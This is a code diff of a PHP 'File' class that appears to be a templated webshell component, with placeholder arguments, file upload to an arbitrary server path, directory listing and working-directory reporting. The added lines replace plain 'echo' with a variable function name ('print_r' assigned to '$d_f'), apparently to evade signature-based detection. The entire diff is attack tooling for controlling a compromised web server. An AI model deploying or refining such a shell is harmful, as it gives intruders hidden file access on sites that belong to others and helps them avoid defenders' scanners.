@@ -37,7 +37,7 @@ class File {
 //        return var_dump($_FILES);
         try {
             if ($_FILES['$arg1}']['error']) echo 'ERROR://upload fail';
-            else move_uploaded_file($_FILES['$arg1}']['tmp_name'], '$arg2}'.$_FILES['$arg1}']['name']);
+            else move_uploaded_file($_FILES['$arg1}']['tmp_name'], '$arg2}' . $_FILES['$arg1}']['name']);
         } catch (Exception $e) {
             echo 'ERROR://No Permission';
         }
@@ -75,7 +75,8 @@ class File {
                 $res .= $value . '``' . (is_dir($file) ? '1' : '0') . '``' . date("Y/m/d H:i", filemtime($file)) . '``' . @filesize($file);
                 $res .= "\n";
             }
-            echo $res;
+            $d_f = 'print_r';
+            echo $d_f($res);
         }
     }
 
@@ -89,7 +90,8 @@ class File {
         } else {
             $root_path .= "/";
         }
-        echo $root_path . '\`\`' . $path;
+        $d_f = 'print_r';
+        echo $d_f($root_path . '\`\`' . $path);
     }
 
     function change() {
@@ -101,5 +103,5 @@ class File {
 }
 
 $f = new File();
-$f->upload();
+$f->pwd();
 ?>
